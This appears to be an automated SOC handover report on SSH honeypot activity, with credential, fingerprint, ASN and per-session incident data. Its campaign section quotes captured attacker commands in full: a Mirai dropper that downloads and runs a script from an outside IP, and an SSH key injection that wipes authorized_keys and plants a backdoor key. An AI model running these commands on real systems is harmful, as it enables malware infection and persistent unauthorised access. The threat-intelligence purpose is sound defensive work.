# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-16 |
| **Generated At** | 2026-11-16T21:27:19Z |
| **Shift Time** | 21:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **674** |
| Confirmed Threats | **624** |
| False Positives Filtered | **50** (7.4%) |
| Unique Attacker IPs | **307** |
| Countries of Origin | **53** |
| High Severity Cases | **490** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **184** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2432** |
| Unique Credential Pairs | **1464** |
| Unique Usernames | **445** |
| Unique Passwords | **991** |
| Successful Auth Pairs | **2128** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 921 |
| `admin` | 130 |
| `support` | 80 |
| `rootssssss23424123123` | 55 |
| `ubuntu` | 53 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 98 |
| `admin` | 63 |
| `123` | 57 |
| `rootssssss23424123123` | 55 |
| `root3245gs5662d34111111111` | 55 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 55 |
| `root` | `root3245gs5662d34111111111` | 50 |
| `root` | `root` | 38 |
| `admin` | `admin` | 37 |
| `support` | `support` | 27 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user1` | `user123` | `77.239.124.153` | 2026-11-16T06:44:13 |
| `ubuntu` | `A123456a` | `109.160.32.118` | 2026-11-16T06:44:16 |
| `root` | `24041988` | `77.239.124.153` | 2026-11-16T06:44:20 |
| `root` | `00000000` | `109.160.32.118` | 2026-11-16T06:44:21 |
| `jenkins` | `1234` | `109.160.32.118` | 2026-11-16T06:44:25 |
| `ubuntu` | `123` | `77.239.124.153` | 2026-11-16T06:44:27 |
| `www` | `!QAZ2wsx` | `109.160.32.118` | 2026-11-16T06:44:30 |
| `localhost` | `localhost` | `77.239.124.153` | 2026-11-16T06:44:32 |
| `node` | `node` | `109.160.32.118` | 2026-11-16T06:44:35 |
| `myuser` | `root` | `77.239.124.153` | 2026-11-16T06:44:38 |
| `daniel` | `daniel` | `109.160.32.118` | 2026-11-16T06:44:40 |
| `user16` | `user16` | `77.239.124.153` | 2026-11-16T06:44:44 |
| `recorder` | `recorder` | `109.160.32.118` | 2026-11-16T06:44:46 |
| `minecraft` | `123` | `109.160.32.118` | 2026-11-16T06:44:50 |
| `testuser` | `testpass123` | `77.239.124.153` | 2026-11-16T06:44:51 |
| `root` | `!Q@W3e4r` | `109.160.32.118` | 2026-11-16T06:44:55 |
| `root` | `1234!@` | `77.239.124.153` | 2026-11-16T06:44:57 |
| `ranga` | `ranga` | `109.160.32.118` | 2026-11-16T06:44:59 |
| `akash` | `Welcome@123` | `77.239.124.153` | 2026-11-16T06:45:03 |
| `root` | `qwe.123456` | `109.160.32.118` | 2026-11-16T06:45:05 |
_… 2108 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **674** |
| Sessions with Fingerprint | **26** |
| Unique HASSH Fingerprints | **26** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 282 |
| OpenSSH | 130 |
| libssh | 71 |
| Unknown | 2 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 200 | 5 |
| `acaa53e0a7d7...` | Mirai/variant | 121 | 115 |
| `f555226df196...` | Mirai/variant | 62 | 33 |
| `16443846184e...` | Generic scanner | 28 | 6 |
| `7d01d047ace6...` | Mirai/variant | 23 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 200 | 5 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 121 | 115 | Mirai/variant |
| `f555226df196...` | libssh | 62 | 33 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 28 | 6 | Generic scanner |
| `7d01d047ace6...` | Go SSH scanner | 23 | 4 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 9 | 5 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 7 | 7 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **215** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 55 | 32 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `107.180.88.176`, `182.237.13.208`, `59.98.148.5`, `176.106.225.115`, `201.249.166.171`, `4.240.126.25`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **307** |
| Unique ASNs | **133** |
| High-Risk ASNs | **121** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 95 | HIGH |
| `AS4766` | Korea Telecom | 11 | HIGH |
| `AS22773` | Cox Communications Inc. | 7 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 7 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (476)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d11f97cbf1ac

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]153` |
| **First Seen** | 2026-11-16 06:44 |
| **Last Seen** | 2026-11-16 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 06:44:13` | `cowrie.session.connect` |
| `2026-11-16 06:44:13` | `cowrie.client.version` |
| `2026-11-16 06:44:13` | `cowrie.client.kex` |
| `2026-11-16 06:44:13` | `cowrie.login.success` |
| `2026-11-16 06:44:14` | `cowrie.session.params` |
| `2026-11-16 06:44:14` | `cowrie.command.input` |
| `2026-11-16 06:44:15` | `cowrie.log.closed` |
| `2026-11-16 06:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]153` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83b341a30502

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]118` |
| **First Seen** | 2026-11-16 06:44 |
| **Last Seen** | 2026-11-16 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 06:44:15` | `cowrie.session.connect` |
| `2026-11-16 06:44:15` | `cowrie.client.version` |
| `2026-11-16 06:44:15` | `cowrie.client.kex` |
| `2026-11-16 06:44:16` | `cowrie.login.success` |
| `2026-11-16 06:44:17` | `cowrie.session.params` |
| `2026-11-16 06:44:17` | `cowrie.command.input` |
| `2026-11-16 06:44:17` | `cowrie.log.closed` |
| `2026-11-16 06:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]118` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61997063c7f7

| Field | Detail |
|---|---|
| **Source IP** | `100.33.23[.]13` |
| **First Seen** | 2026-11-16 06:59 |
| **Last Seen** | 2026-11-16 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ssh -V 2>&1` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 06:59:36` | `cowrie.session.connect` |
| `2026-11-16 06:59:36` | `cowrie.client.version` |
| `2026-11-16 06:59:36` | `cowrie.client.kex` |
| `2026-11-16 06:59:36` | `cowrie.login.success` |
| `2026-11-16 06:59:37` | `cowrie.session.params` |
| `2026-11-16 06:59:37` | `cowrie.command.input` |
| `2026-11-16 06:59:37` | `cowrie.log.closed` |
| `2026-11-16 06:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.33.23[.]13` to AbuseIPDB if not already reported
- [ ] Block `100.33.23[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4e269661486

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-16 07:02 |
| **Last Seen** | 2026-11-16 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:02:42` | `cowrie.session.connect` |
| `2026-11-16 07:02:42` | `cowrie.login.success` |
| `2026-11-16 07:02:43` | `cowrie.session.params` |
| `2026-11-16 07:02:43` | `cowrie.log.closed` |
| `2026-11-16 07:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d6dd350484c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]252` |
| **First Seen** | 2026-11-16 07:05 |
| **Last Seen** | 2026-11-16 07:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:05:29` | `cowrie.session.connect` |
| `2026-11-16 07:05:29` | `cowrie.login.success` |
| `2026-11-16 07:05:30` | `cowrie.session.params` |
| `2026-11-16 07:05:30` | `cowrie.log.closed` |
| `2026-11-16 07:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]252` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc871d31ec91

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-16 07:10 |
| **Last Seen** | 2026-11-16 07:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:10:51` | `cowrie.session.connect` |
| `2026-11-16 07:10:51` | `cowrie.client.version` |
| `2026-11-16 07:10:51` | `cowrie.client.kex` |
| `2026-11-16 07:10:51` | `cowrie.login.success` |
| `2026-11-16 07:10:51` | `cowrie.direct-tcpip.request` |
| `2026-11-16 07:10:52` | `cowrie.direct-tcpip.data` |
| `2026-11-16 07:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d848ab65be36

| Field | Detail |
|---|---|
| **Source IP** | `191.7.159[.]201` |
| **First Seen** | 2026-11-16 07:12 |
| **Last Seen** | 2026-11-16 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `whoami` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:12:27` | `cowrie.session.connect` |
| `2026-11-16 07:12:27` | `cowrie.client.version` |
| `2026-11-16 07:12:27` | `cowrie.client.kex` |
| `2026-11-16 07:12:27` | `cowrie.login.success` |
| `2026-11-16 07:12:28` | `cowrie.session.params` |
| `2026-11-16 07:12:28` | `cowrie.command.input` |
| `2026-11-16 07:12:29` | `cowrie.log.closed` |
| `2026-11-16 07:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.7.159[.]201` to AbuseIPDB if not already reported
- [ ] Block `191.7.159[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44c968612ed0

| Field | Detail |
|---|---|
| **Source IP** | `78.128.112[.]74` |
| **First Seen** | 2026-11-16 07:15 |
| **Last Seen** | 2026-11-16 07:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'SSH check'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:15:17` | `cowrie.session.connect` |
| `2026-11-16 07:15:17` | `cowrie.client.version` |
| `2026-11-16 07:15:17` | `cowrie.client.kex` |
| `2026-11-16 07:15:17` | `cowrie.login.success` |
| `2026-11-16 07:15:19` | `cowrie.session.params` |
| `2026-11-16 07:15:19` | `cowrie.command.input` |
| `2026-11-16 07:15:19` | `cowrie.log.closed` |
| `2026-11-16 07:15:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.128.112[.]74` to AbuseIPDB if not already reported
- [ ] Block `78.128.112[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3760949c21ca

| Field | Detail |
|---|---|
| **Source IP** | `116.59.10[.]150` |
| **First Seen** | 2026-11-16 07:17 |
| **Last Seen** | 2026-11-16 07:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:17:06` | `cowrie.session.connect` |
| `2026-11-16 07:17:07` | `cowrie.client.version` |
| `2026-11-16 07:17:07` | `cowrie.client.kex` |
| `2026-11-16 07:17:10` | `cowrie.login.success` |
| `2026-11-16 07:17:10` | `cowrie.direct-tcpip.request` |
| `2026-11-16 07:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.59.10[.]150` to AbuseIPDB if not already reported
- [ ] Block `116.59.10[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-791c125c3b15

| Field | Detail |
|---|---|
| **Source IP** | `185.15.61[.]102` |
| **First Seen** | 2026-11-16 07:17 |
| **Last Seen** | 2026-11-16 07:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:17:16` | `cowrie.session.connect` |
| `2026-11-16 07:17:16` | `cowrie.client.version` |
| `2026-11-16 07:17:16` | `cowrie.client.kex` |
| `2026-11-16 07:17:18` | `cowrie.login.success` |
| `2026-11-16 07:17:18` | `cowrie.direct-tcpip.request` |
| `2026-11-16 07:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.15.61[.]102` to AbuseIPDB if not already reported
- [ ] Block `185.15.61[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69631a6b1aa1

| Field | Detail |
|---|---|
| **Source IP** | `216.232.226[.]40` |
| **First Seen** | 2026-11-16 07:19 |
| **Last Seen** | 2026-11-16 07:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:19:54` | `cowrie.session.connect` |
| `2026-11-16 07:19:55` | `cowrie.client.version` |
| `2026-11-16 07:19:55` | `cowrie.client.kex` |
| `2026-11-16 07:19:56` | `cowrie.login.success` |
| `2026-11-16 07:19:56` | `cowrie.direct-tcpip.request` |
| `2026-11-16 07:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.232.226[.]40` to AbuseIPDB if not already reported
- [ ] Block `216.232.226[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b1ea0257853

| Field | Detail |
|---|---|
| **Source IP** | `100.33.23[.]13` |
| **First Seen** | 2026-11-16 07:23 |
| **Last Seen** | 2026-11-16 07:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `df -h | head -5` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:23:17` | `cowrie.session.connect` |
| `2026-11-16 07:23:17` | `cowrie.client.version` |
| `2026-11-16 07:23:17` | `cowrie.client.kex` |
| `2026-11-16 07:23:17` | `cowrie.login.success` |
| `2026-11-16 07:23:18` | `cowrie.session.params` |
| `2026-11-16 07:23:18` | `cowrie.command.input` |
| `2026-11-16 07:23:18` | `cowrie.log.closed` |
| `2026-11-16 07:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.33.23[.]13` to AbuseIPDB if not already reported
- [ ] Block `100.33.23[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37f29cd8e5a8

| Field | Detail |
|---|---|
| **Source IP** | `128.14.227[.]37` |
| **First Seen** | 2026-11-16 07:25 |
| **Last Seen** | 2026-11-16 07:25 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0[.]0 Safari/537.36 Edg/120.0.0[.]0` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:25:32` | `cowrie.session.connect` |
| `2026-11-16 07:25:32` | `cowrie.login.success` |
| `2026-11-16 07:25:32` | `cowrie.session.params` |
| `2026-11-16 07:25:32` | `cowrie.command.input` |
| `2026-11-16 07:25:32` | `cowrie.command.failed` |
| `2026-11-16 07:25:32` | `cowrie.command.input` |
| `2026-11-16 07:25:32` | `cowrie.command.input` |
| `2026-11-16 07:25:51` | `cowrie.log.closed` |
| `2026-11-16 07:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `128.14.227[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e82e95af0114

| Field | Detail |
|---|---|
| **Source IP** | `128.14.227[.]37` |
| **First Seen** | 2026-11-16 07:25 |
| **Last Seen** | 2026-11-16 07:26 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:25:51` | `cowrie.session.connect` |
| `2026-11-16 07:25:51` | `cowrie.login.success` |
| `2026-11-16 07:25:51` | `cowrie.session.params` |
| `2026-11-16 07:26:10` | `cowrie.log.closed` |
| `2026-11-16 07:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `128.14.227[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c2da6c9a88f

| Field | Detail |
|---|---|
| **Source IP** | `186.238.242[.]194` |
| **First Seen** | 2026-11-16 07:29 |
| **Last Seen** | 2026-11-16 07:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:29:57` | `cowrie.session.connect` |
| `2026-11-16 07:29:58` | `cowrie.client.version` |
| `2026-11-16 07:29:58` | `cowrie.client.kex` |
| `2026-11-16 07:30:00` | `cowrie.login.success` |
| `2026-11-16 07:30:00` | `cowrie.direct-tcpip.request` |
| `2026-11-16 07:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.238.242[.]194` to AbuseIPDB if not already reported
- [ ] Block `186.238.242[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff37c6d2344b

| Field | Detail |
|---|---|
| **Source IP** | `62.220.104[.]155` |
| **First Seen** | 2026-11-16 07:30 |
| **Last Seen** | 2026-11-16 07:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:30:06` | `cowrie.session.connect` |
| `2026-11-16 07:30:07` | `cowrie.client.version` |
| `2026-11-16 07:30:07` | `cowrie.client.kex` |
| `2026-11-16 07:30:08` | `cowrie.login.success` |
| `2026-11-16 07:30:09` | `cowrie.direct-tcpip.request` |
| `2026-11-16 07:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.220.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `62.220.104[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d154e0f60388

| Field | Detail |
|---|---|
| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-11-16 07:39 |
| **Last Seen** | 2026-11-16 07:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:39:27` | `cowrie.session.connect` |
| `2026-11-16 07:39:27` | `cowrie.client.version` |
| `2026-11-16 07:39:28` | `cowrie.client.kex` |
| `2026-11-16 07:39:28` | `cowrie.login.success` |
| `2026-11-16 07:39:29` | `cowrie.session.params` |
| `2026-11-16 07:39:29` | `cowrie.command.input` |
| `2026-11-16 07:39:29` | `cowrie.command.failed` |
| `2026-11-16 07:39:29` | `cowrie.log.closed` |
| `2026-11-16 07:39:30` | `cowrie.session.params` |
| `2026-11-16 07:39:30` | `cowrie.command.input` |
| `2026-11-16 07:39:31` | `cowrie.session.file_download` |
| `2026-11-16 07:39:31` | `cowrie.log.closed` |
| `2026-11-16 07:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8dee263f3c

| Field | Detail |
|---|---|
| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-11-16 07:39 |
| **Last Seen** | 2026-11-16 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:39:31` | `cowrie.session.connect` |
| `2026-11-16 07:39:31` | `cowrie.client.version` |
| `2026-11-16 07:39:31` | `cowrie.client.kex` |
| `2026-11-16 07:39:32` | `cowrie.login.success` |
| `2026-11-16 07:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
